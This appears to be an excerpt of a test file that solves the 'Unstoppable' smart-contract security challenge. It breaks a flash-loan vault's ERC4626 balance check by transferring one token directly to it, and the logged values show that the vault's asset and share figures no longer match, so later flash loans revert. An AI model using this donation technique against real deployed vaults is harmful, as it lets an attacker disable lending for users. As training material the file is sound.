...
describe("[Challenge] Unstoppable", function () {
  ...
  it("Execution", async function () {
    // we break this line in the contract by dinating 1 token
    // if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
    token.connect(player);
    console.log(await vault.totalAssets()); // BigNumber { value: "1000000000000000000000000" }
    console.log(await vault.convertToShares(await vault.totalAssets())); // BigNumber { value: "1000000000000000000000000" }
    await token.transfer(vault.address, 1);

    console.log(await vault.totalAssets()); // BigNumber { value: "1000000000000000000000001" }
    console.log(await vault.convertToShares(await vault.totalAssets())); //BigNumber { value: "1000000000000000000000000" }
  });
  ...
  after(async function () {
    ...
    await expect(receiverContract.executeFlashLoan(100n * 10n ** 18n)).to.be
      .reverted;
  });
});
